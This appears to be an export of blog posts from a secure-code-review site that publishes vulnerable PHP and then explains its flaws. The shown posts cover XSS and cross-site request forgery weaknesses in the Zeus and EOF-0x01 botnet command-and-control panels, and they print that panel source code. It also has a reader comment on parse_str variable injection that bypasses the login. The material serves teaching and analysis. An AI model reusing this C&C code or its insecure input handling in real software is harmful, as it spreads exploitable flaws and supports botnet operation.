		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Zeus C&C

Fixed in Version: ?

Issue Type: XSS and XSRF

Original Code: <a href="http://spotthevuln.com/2011/07/imagination/">Found Here</a>
<h1>Details</h1>
This week’s bugs affected Zeus C&C 1.1.0.0.  The file we’re looking at is mod.bcmds.php.  The first thing that popped out at me was the named constant “QUERY_STRING” that’s being used in various places in code.  Although we don’t get to see exactly where QUERY_STRING is being defined in the code snippet as a general rule of thumb, values from the query string cannot be trusted.  In this case, QUERY_STRING is defined in a different file (in.php) in the following line: 
<code lang="PHP">
define('QUERY_STRING', QUERY_STRING_BLANK.$module); 
</code>
QUERY_STRING_BLANK is defined in the following way (also in in.php):
<code lang="PHP">
define('QUERY_STRING_BLANK', $_SERVER['PHP_SELF'].'?m=');
</code>
Veteran Spot the Vuln readers will immediately realize that $_SERVER[‘PHP_SELF’] cannot be trusted and can contain attacker supplied data.  An old, but good write-up on PHP_SELF XSS can be found <a href="http://seancoates.com/blogs/xss-woes" target="_blank">here</a>.
<br>
Knowing this, we’re free to XSS the Zeus C&C and hijack the bots… as long as we can get the Zeus botmaster to visit a page we own (a reasonable request) AND we can figure out the domain name the botmaster is using for their C&C (fairly difficult).  Botmasters can take advantage of browser same origin policy defenses and use a host file to create a unique domain for their C&Cs… minimizing the impact of reflected XSS exploits against their C&Cs.  I’m wondering if this is the first public security advice for the botmaster community…
<br>
I’ve highlighted the lines that insecurely use the QUERYSTRING constant to build HTML markup, resulting in XSS.  I couldn’t find a mod.bcmds.php file after Zeus 1.1.0.0, so I’m considering this specific XSS issue fixed.
<br>
There is a second, more subtle issue in this code… one that still affects the latest Zeus C&C builds.  The C&C developer seemingly went through great lengths to defend against SQL injection.  A quick perusal through the code shows a smattering of addslashes() and is_numeric() in attempts to validate input before passing it to backend databases.  What’s missing however… are nonce/token checks (XSRF defenses).  The following code snippet is a perfect example:
<code lang="PHP">
else if(isset($_GET['del'])&&is_numeric($_GET['del'])&&$pedt)
{
  mysql_query('DELETE FROM  '.TABLE_BCMDS.' WHERE id='.$_GET['del'].' LIMIT 1');
  header('Location: '.QUERY_STRING);
  die();  
}
</code>
In the snippet above, we see that the C&C code grabs a value directly from the querystring, validates that it is_numeric(), and then passes the value to a DELETE statement.  No where does the code attempt to validate that the request wasn’t generated via XSRF.  If an attacker can discover the location of the C&C and lure the botmaster to an attacker controlled page, they can setup an XSRF attack to delete the entire TABLE_BCMDS.  Looking through the latest, most current Zeus C&C code, XSRF defenses still have not been put into place… come on guys, even WordPress has XSRF defenses!  <a href="http://codex.wordpress.org/Function_Reference/wp_verify_nonce" target="_blank">http://codex.wordpress.org/Function_Reference/wp_verify_nonce</a>

<h1>Vulnerable Code</h1>
<code lang="PHP" highlight="50,55,87,101">
<?php if(!defined('__INDEX__'))die();
$pedt=PRIV&PRIV_BOTS_CMDS_EDIT;
if((isset($_GET['new'])&&$pedt)||(isset($_GET['edit'])&&is_numeric($_GET['edit'])))
{
  if(!@include_once('fmt.php'))die('fmt.php not founded!');
  $name=isset($_POST['name'])?$_POST['name']:time();
  $stat=isset($_POST['stat'])?($_POST['stat']?1:0):0;
  $limit=(isset($_POST['limit'])&&is_numeric($_POST['limit']))?$_POST['limit']:0;
  $cnts=isset($_POST['cnts'])?$_POST['cnts']:'';
  $cids=isset($_POST['cids'])?$_POST['cids']:'';
  $bns=isset($_POST['bns'])?$_POST['bns']:'';
  $cmds=isset($_POST['cmds'])?$_POST['cmds']:'';

  if($_SERVER['REQUEST_METHOD']=='POST'&&strlen($name)>0&&$pedt)
  {
    $cmdsb=EncodeBuffer(str_replace("\r\n","\n",trim($cmds)));
    $data='name=\''.addslashes($name).'\',stat='.$stat.',lim='.$limit.',c=\''.addslashes(SepFmt($cnts)).'\',comps=\''.addslashes(SepFmt($cids)).'\',bns=\''.addslashes(SepFmt($bns)).'\',cmds=\''.addslashes($cmdsb).'\'';
    if(isset($_GET['new']))mysql_query('INSERT INTO '.TABLE_BCMDS.' SET '.$data.',id2='.time());
    else mysql_query('UPDATE '.TABLE_BCMDS.' SET '.$data.' WHERE id=\''.$_GET['edit'].'\' LIMIT 1');
    header('Location: '.QUERY_STRING);
  }
  else
  {
    if(!$pedt&&isset($_GET['new']))unset($_GET['new']);
    HTMLBegin(isset($_GET['new'])?LNG_MBCMDS_NEWCMD:($pedt?LNG_MBCMDS_EDITCMD:LNG_MBCMDS_VIEWCMD));  
    if(isset($_GET['new']))print CmdForm('new',LNG_MBCMDS_NEWCMD,LNG_MBCMDS_ADD,$name,$stat,$limit,$cnts,$cids,$bns,$cmds);
    else
    {
      $r=mysql_query('SELECT * FROM '.TABLE_BCMDS.' WHERE id=\''.$_GET['edit'].'\' LIMIT 1');
      if($r&&mysql_affected_rows()==1&&($m=mysql_fetch_assoc($r)))print CmdForm('edit='.$_GET['edit'],$pedt?LNG_MBCMDS_EDITCMD:LNG_MBCMDS_VIEWCMD,$pedt?LNG_MBCMDS_EDIT:'',$m['name'],$m['stat'],$m['lim'],SepFmtB($m['c']),SepFmtB($m['comps']),SepFmtB($m['bns']),DecodeBuffer($m['cmds']));
      else print '<font class="error">'.LNG_MBCMDS_ERROR_1.'</font>';
    }
    HTMLEnd();
  }
  die();
}
else if(isset($_GET['del'])&&is_numeric($_GET['del'])&&$pedt)
{
  mysql_query('DELETE FROM  '.TABLE_BCMDS.' WHERE id='.$_GET['del'].' LIMIT 1');
  header('Location: '.QUERY_STRING);
  die();  
}
else if(isset($_GET['res'])&&is_numeric($_GET['res'])&&$pedt)
{
  mysql_query('UPDATE '.TABLE_BCMDS.' SET exc=\'0\',rcomps=\'\',exct=\'0\' WHERE id='.$_GET['res'].' LIMIT 1');
  header('Location: '.QUERY_STRING);
  die();
}

HTMLBegin(LNG_MBCMDS,$pedt?'function DelCmd(uid,q){if(confirm(q))window.location=\''.QUERY_STRING.'&del=\'+uid;};function ResCmd(uid,q){if(confirm(q))window.location=\''.QUERY_STRING.'&res=\'+uid;}':'');

$r=mysql_query('SELECT * FROM '.TABLE_BCMDS);      
$total=mysql_affected_rows();
print '<table class="tbl1"><tr><td class="td1" colspan="'.($pedt?9:10).'">'.LNG_MBCMDS_R_CMDS.'&nbsp;('.$total.')</td>';
if($pedt)print '<td class="td1" align="center"><input type="submit" value="'.LNG_MBCMDS_NEWCMD.'" class="ism" style="width:100%" onClick="window.location=\''.QUERY_STRING.'&new\';"></td>';
print '</tr><tr><td class="td1">'.LNG_MBCMDS_R_ID.'</td><td class="td1">'.LNG_MBCMDS_R_NAME.'</td><td class="td1">'.LNG_MBCMDS_R_STAT.'</td><td class="td1">'.LNG_MBCMDS_R_LIMIT.'</td><td class="td1">'.LNG_MBCMDS_R_REQ.'</td><td class="td1">'.LNG_MBCMDS_R_EXEC.'</td><td class="td1">'.LNG_MBCMDS_R_CNTS.'</td><td class="td1">'.LNG_MBCMDS_R_CIDS.'</td><td class="td1">'.LNG_MBCMDS_R_BNS.'</td><td class="td1">&nbsp;</td></tr>';
if($total>0)
{
  $j=0;
  while(($m=mysql_fetch_assoc($r)))
  {
    $a=(($j++)%2==0?1:2);
    print '<tr valign="top"><td align="right" class="tdx'.$a.'">'.$m['id2'].'</td>'.
          '<td class="tdx'.$a.'">'.htmlentities($m['name']).'</td>'.
          '<td class="tdx'.$a.'">'.($m['stat']?LNG_MBCMDS_STAT_ON:LNG_MBCMDS_STAT_OFF).'</td>'.
          '<td align="right" class="tdx'.$a.'">'.$m['lim'].'</td>'.
          '<td align="right" class="tdx'.$a.'">'.$m['exc'].'</td>'.
          '<td align="right" class="tdx'.$a.'">'.$m['exct'].'</td>'.
          '<td class="tdx'.$a.'">'.($m['c']==''?'-':str_replace(',','<br>',htmlentities(SepFmtB($m['c'])))).'</td>'.
          '<td class="tdx'.$a.'">'.($m['comps']==''?'-':str_replace(',','<br>',htmlentities(SepFmtB($m['comps'])))).'</td>'.
          '<td class="tdx'.$a.'">'.($m['bns']==''?'-':str_replace(',','<br>',htmlentities(SepFmtB($m['bns'])))).'</td>'.
          '<td class="tdx'.$a.'" align="center"><input class="ism" style="width:90%" type="submit" value="'.($pedt?LNG_MBCMDS_R_EDIT:LNG_MBCMDS_R_VIEW).'" onClick="window.location=\''.QUERY_STRING.'&edit='.$m['id'].'\';return false;">';
    if($pedt)print '<br><input class="ism" style="width:90%" type="submit" value="'.LNG_MBCMDS_R_RES_OK.'" onClick="javascript:ResCmd(\''.$m['id'].'\',\''.addslashes(sprintf(LNG_MBCMDS_R_RES,$m['name'])).'\');return false;"><br><input class="ism" style="width:90%" type="submit" value="'.LNG_MBCMDS_R_DEL_OK.'" onClick="javascript:DelCmd(\''.$m['id'].'\',\''.addslashes(sprintf(LNG_MBCMDS_R_DEL,$m['name'])).'\');return false;">';
    print '</td></tr>';
  }
}
else print '<tr><td align="center" colspan="10" class="tdx1"><i>'.LNG_MBCMDS_R_NONE.'</i></td></tr>';
print '</table>';
HTMLEnd();

function CmdForm($cmd,$title,$action,$name,$stat,$limit,$cnts,$cids,$bns,$cmds)
{
  $en=$action==''?0:1;
  $stat=$stat?1:0;
  $ro=$en?'':'readonly ';
  
  $str=$en?'<form method="POST" action="'.QUERY_STRING.'&'.$cmd.'">':'';
  $str.='<table class="tbl1" width="350"><tr><td class="td1" colspan="2">'.$title.'</td></tr>'.
        '<tr><td>'.LNG_MBCMDS_NAME.'</td><td width="100%"><input '.$ro.'type="text" name="name" value="'.htmlentities($name).'" style="width:100%"></td></tr>'.
        '<tr><td colspan="2"><table class="tbl1"><tr><td>'.LNG_MBCMDS_STAT.'</td><td width="100%"><select '.($en?'':'disabled ').'name="stat" style="width:100%">'.
        '<option value="1"'.($stat==1?' selected':'').'>'.LNG_MBCMDS_STAT_ON.'</option>'.
        '<option value="0"'.($stat==0?' selected':'').'>'.LNG_MBCMDS_STAT_OFF.'</option>'.
        '</select></td></tr>'.
        '<tr><td>'.LNG_MBCMDS_LIMIT.'</td><td width="100%"><input '.$ro.'type="text" name="limit" value="'.$limit.'" style="width:100%"></td></tr>'.
        '<tr><td>'.LNG_MBCMDS_CNTS.'</td><td width="100%"><input '.$ro.'type="text" name="cnts" value="'.$cnts.'" style="width:100%"></td></tr>'.
        '<tr><td>'.LNG_MBCMDS_CIDS.'</td><td width="100%"><input '.$ro.'type="text" name="cids" value="'.$cids.'" style="width:100%"></td></tr>'.
        '<tr><td>'.LNG_MBCMDS_BNS.'</td><td width="100%"><input '.$ro.'type="text" name="bns" value="'.$bns.'" style="width:100%"></td></tr>'.
        '<tr><td valign="top">'.LNG_MBCMDS_CMDS.'</td><td><textarea wrap="off" '.$ro.'name="cmds" style="width:100%;height:100">'.htmlentities($cmds).'</textarea></td></tr>'.
        '</table></tr></td><tr><td colspan="2" align="right">';
  if($en)$str.='<input type="submit" class="ism" value="'.$action.'" style="width:100">&nbsp;';
  $str.='<input type="submit" class="ism" value="'.LNG_MBCMDS_BACK.'" style="width:100" onClick="window.location.href=\''.QUERY_STRING.'\';return false;"></td></tr>';
  if($en)$str.='</form>';
  return $str.'</table>';
}
function SepFmt($str){if(strlen($str)>1){$str=str_replace(',','|',trim($str));if($str[0]!='|')$str='|'.$str;if($str[strlen($str)-1]!='|')$str.='|';}return $str;}
function SepFmtB($str){if(strlen($str)>1){$str=str_replace('|',',',trim($str));if($str[0]==',')$str=substr($str,1);$l=strlen($str);if($str[$l-1]==',')$str=substr($str,0,$l-1);}return $str;}
?>
</code>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1543</wp:post_id>
		<wp:post_date>2011-07-08 06:20:30</wp:post_date>
		<wp:post_date_gmt>2011-07-08 13:20:30</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>imagination-xss-and-xsrf</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="cross-site-request-forgery-xsrf"><![CDATA[Cross Site Request Forgery (XSRF)]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Writing</title>
		<link>http://spotthevuln.com/2011/07/writing/</link>
		<pubDate>Fri, 15 Jul 2011 06:13:21 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1550</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>Writing is a struggle against silence.
Carlos Fuentes
</strong></blockquote>
<code lang="PHP">
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title> </title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<?php
include("./config.php");
include("./functions.php");

$query = $_SERVER['QUERY_STRING'];
parse_str($query);

ConnectToDB($server, $user, $pw, $dbname);
?>

<style type="text/css">
<!--
@import url("./style.css");
-->
</style>

<script>
<!--
function setfocus()
{
	document.form1.cmd.focus();
	document.form1.logfield.scrollTop = '9999';
}
-->
</script>

</head>

<body onload="setfocus()">
<?php 
if($_POST['pw']!=$botpw)
{
?>
<table width="242" border="0" cellpadding="0" cellspacing="0" bgcolor="#D0EAD2" class="tableborder">
  <!--DWLayoutTable-->
  <tr>
    <td width="239" height="44" valign="top"><form action="./control.php" method="post" name="login" id="login">
        Password:<br>
        <input name="pw" type="password" id="pw">
        <input name="login" type="submit" id="login" value="Login">
    </form></td>
  </tr>
</table>
<?php
}
else
{
?> 
<table width="516" border="0" cellpadding="0" cellspacing="0" bgcolor="#D5E1F0" class="tableborder">
        <!--DWLayoutTable-->
        <tr>
          <td width="78" height="43" valign="middle"><form action="./control.php" method="post" name="logout" id="logout">
              <input name="logout" type="submit" id="logout" value="Logout">
          </form></td>
          <td width="143" valign="middle"><form action="./control.php" method="post" name="command" id="command">
              <input name="command" type="submit" id="command" value="Command center">
              <input name="pw" type="hidden" id="pw" value="<?php echo($_POST['pw']); ?>">
          </form></td>
		  <td width="193" valign="middle"><form action="./control.php" method="post" name="queue" id="queue">
              <input name="queue" type="submit" id="queue" value="Manage commandqueue">
              <input name="pw" type="hidden" id="pw" value="<?php echo($_POST['pw']); ?>">
          </form></td>
          <td width="101" valign="middle"><form action="./control.php" method="post" name="logdel" id="logdel">
              <input name="logdel" type="submit" id="logdel" value="Delete log">
              <input name="pw" type="hidden" id="pw" value="<?php echo($_POST['pw']); ?>">
          </form></td>
        </tr>
</table>
<?php
if(isset($_POST['queue']))
{

if(isset($_POST['action']))
{
	if($_POST['action']==2)
	{
		DeleteCommandsFromQueue();		
	}
	
	if($_POST['action']==4)
	{
		EditCommandForBot();		
	}
}

if($_POST['action']!=3)
{
?>
<br>
<form action="./control.php" method="post" name="form1" id="form1">
<table width="648" border="0" cellpadding="0" cellspacing="0" bgcolor="#F2ECD7" class="tableborder">
  <!--DWLayoutTable-->
  <tr>
    <td height="486" colspan="2" valign="top">Bot:<br>
          <select name="botselect" id="botselect">
		  <?php
		  ShowAllBotsCmdList();
		  ?>
        </select>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1550</wp:post_id>
		<wp:post_date>2011-07-14 23:13:21</wp:post_date>
		<wp:post_date_gmt>2011-07-15 06:13:21</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>writing</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2130</wp:comment_id>
			<wp:comment_author><![CDATA[Code Snippet Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/07/writing-fake-xss-csrf/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-07-14 23:14:26</wp:comment_date>
			<wp:comment_date_gmt>2011-07-15 06:14:26</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...]  [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1310968715.4341";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:14:"1310710466.711";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Writing - Fake XSS + CSRF</title>
		<link>http://spotthevuln.com/2011/07/writing-fake-xss-csrf/</link>
		<pubDate>Fri, 15 Jul 2011 06:13:30 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1553</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: EOF-0x01 Command and Control

Fixed in Version: ?

Issue Type: XSS and XSRF

Original Code: <a href="http://spotthevuln.com/2011/07/writing/">Found Here</a>
<h1>Details</h1>
This week, we had a couple of bugs here affecting EOF-0x01 Command and Control.  A red herring is the use of echo($_POST['pw']); to build HTML markup.  Upon first glance, this seems like a straight forward XSS bug.   This issue is mitigated by the fact that $_POST['pw'] is only displayed if it is equal to $botpw (whose default value happens to be ‘bla’) .  So unless the botmaster has an XSS payload for their password, this one is going to be really difficult to exploit.    The other interesting part is the if statements that look at $_POST[‘action’].  If the user has provided the correct $_POST[‘pw’] and also provides a $_POST[‘action’] of 2 or 3, DeleteCommandsFromQueue() and EditCommandForBot() will be executed respectively.  Developers (even malware developers) should be wary of allowing Create, Update, or Delete operations without defending against cross site request forgery.  These functions are not protected. 

<h1>Vulnerable Code</h1>
<code lang="PHP" highlight="63,67,71,83,88">
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title> </title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<?php
include("./config.php");
include("./functions.php");

$query = $_SERVER['QUERY_STRING'];
parse_str($query);

ConnectToDB($server, $user, $pw, $dbname);
?>

<style type="text/css">
<!--
@import url("./style.css");
-->
</style>

<script>
<!--
function setfocus()
{
	document.form1.cmd.focus();
	document.form1.logfield.scrollTop = '9999';
}
-->
</script>

</head>

<body onload="setfocus()">
<?php 
if($_POST['pw']!=$botpw)
{
?>
<table width="242" border="0" cellpadding="0" cellspacing="0" bgcolor="#D0EAD2" class="tableborder">
  <!--DWLayoutTable-->
  <tr>
    <td width="239" height="44" valign="top"><form action="./control.php" method="post" name="login" id="login">
        Password:<br>
        <input name="pw" type="password" id="pw">
        <input name="login" type="submit" id="login" value="Login">
    </form></td>
  </tr>
</table>
<?php
}
else
{
?> 
<table width="516" border="0" cellpadding="0" cellspacing="0" bgcolor="#D5E1F0" class="tableborder">
        <!--DWLayoutTable-->
        <tr>
          <td width="78" height="43" valign="middle"><form action="./control.php" method="post" name="logout" id="logout">
              <input name="logout" type="submit" id="logout" value="Logout">
          </form></td>
          <td width="143" valign="middle"><form action="./control.php" method="post" name="command" id="command">
              <input name="command" type="submit" id="command" value="Command center">
              <input name="pw" type="hidden" id="pw" value="<?php echo($_POST['pw']); ?>">
          </form></td>
		  <td width="193" valign="middle"><form action="./control.php" method="post" name="queue" id="queue">
              <input name="queue" type="submit" id="queue" value="Manage commandqueue">
              <input name="pw" type="hidden" id="pw" value="<?php echo($_POST['pw']); ?>">
          </form></td>
          <td width="101" valign="middle"><form action="./control.php" method="post" name="logdel" id="logdel">
              <input name="logdel" type="submit" id="logdel" value="Delete log">
              <input name="pw" type="hidden" id="pw" value="<?php echo($_POST['pw']); ?>">
          </form></td>
        </tr>
</table>
<?php
if(isset($_POST['queue']))
{

if(isset($_POST['action']))
{
	if($_POST['action']==2)
	{
		DeleteCommandsFromQueue();		
	}
	
	if($_POST['action']==4)
	{
		EditCommandForBot();		
	}
}

if($_POST['action']!=3)
{
?>
<br>
<form action="./control.php" method="post" name="form1" id="form1">
<table width="648" border="0" cellpadding="0" cellspacing="0" bgcolor="#F2ECD7" class="tableborder">
  <!--DWLayoutTable-->
  <tr>
    <td height="486" colspan="2" valign="top">Bot:<br>
          <select name="botselect" id="botselect">
		  <?php
		  ShowAllBotsCmdList();
		  ?>
        </select>
</code>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1553</wp:post_id>
		<wp:post_date>2011-07-14 23:13:30</wp:post_date>
		<wp:post_date_gmt>2011-07-15 06:13:30</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>writing-fake-xss-csrf</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2132</wp:comment_id>
			<wp:comment_author><![CDATA[Yuliy]]></wp:comment_author>
			<wp:comment_author_email>yuliy.pisetsky@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>174.254.227.49</wp:comment_author_IP>
			<wp:comment_date>2011-07-15 19:17:10</wp:comment_date>
			<wp:comment_date_gmt>2011-07-16 02:17:10</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[The biggest bug is the variable injection brought about by parse_str, which makes for a login bypass and also allows for xss. There is no csrf though,  since both action and pw must come from the same source.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1310782630.5188";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1310968710.8022";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2134</wp:comment_id>
			<wp:comment_author><![CDATA[bkrios]]></wp:comment_author>
			<wp:comment_author_email>billy.rios+wordpress@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://xs-sniper.com</wp:comment_author_url>
			<wp:comment_author_IP>64.134.220.142</wp:comment_author_IP>
			<wp:comment_date>2011-07-17 22:59:33</wp:comment_date>
			<wp:comment_date_gmt>2011-07-18 05:59:33</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[absolutely right!  I guess I shouldn't be auditing code in a sleepless state :)]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>2132</wp:comment_parent>
			<wp:comment_user_id>2</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1310968773.7153";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Grammys</title>
		<link>http://spotthevuln.com/2011/07/grammys/</link>
		<pubDate>Mon, 18 Jul 2011 06:03:58 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1558</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>The last thing I want is to walk into my house after a long day and see all the Grammys and awards. It would make me feel weird.
Alicia Keys
</strong></blockquote>
<code lang="PHP">
<?php

include_once('geoipcity.inc');
include_once('../mysqllog.php');

$countrys = $_POST['countrys'];
$states = $_POST['states'];

if ($countrys == "") {
	$countrys = "all";
}
if ($states == "") {
	$states = "all";
}

$date = date("m-d");
list($month, $day) = explode('-', $date);


print "<STYLE><!-- a:link{color:#404040;text-decoration:none;}  a:visited {color:#909090;text-decoration:none;}  a:active {color:#000000;text-decoration:none;}  a:hover {color:#000000;text-decoration:none;}  input {BACKGROUND-COLOR: #66CF96; BORDER-BOTTOM: #ffffff 1px solid; BORDER-LEFT: #ffffff 1px solid; BORDER-RIGHT: #ffffff 1px solid; BORDER-TOP: #ffffff 1px solid; COLOR: #000000; FONT-FAMILY: Tahoma,sans-serif; FONT-SIZE: 12px;}  --></STYLE>
		<BODY bgcolor=#DDDDDD text=#505050 marginwidth=0><table align=center border=1><TD><form action=index.php method=post><B>Select by country</B><TD><select name=countrys><option value=all>All countries";

$j = 1;
while ($GEOIP_COUNTRY_CODES[$j] != "") {
	print "<option value=$GEOIP_COUNTRY_CODES[$j]>$GEOIP_COUNTRY_NAMES[$j]\r\n";
	$j++;
}

print "</SELECT><TD><BR><INPUT type=submit value=submit></FORM><TR><TD>
		<FORM action=index.php method=post><B>Select by state</B><TD><select name=states><option value=all>all<option value=AK>AK<option value=AL>AL<option value=AR>AR<option value=AS>AS<option value=AZ>AZ<option value=CA>CA<option value=CO>CO
		<option value=CT>CT<option value=DC>DC<option value=DE>DE<option value=FL>FL<option value=GA>GA<option value=HI>HI<option value=IA>IA<option value=ID>ID<option value=IL>IL<option value=IN>IN
		<option value=KS>KS<option value=KY>KY<option value=LA>LA<option value=MA>MA<option value=MD>MD<option value=ME>ME<option value=MI>MI<option value=MN>MN<option value=MO>MO<option value=MP>MP
		<option value=MS>MS<option value=MT>MT<option value=NC>NC<option value=ND>ND<option value=NE>NE<option value=NH>NH<option value=NJ>NJ<option value=NM>NM<option value=NV>NU<option value=NY>NY
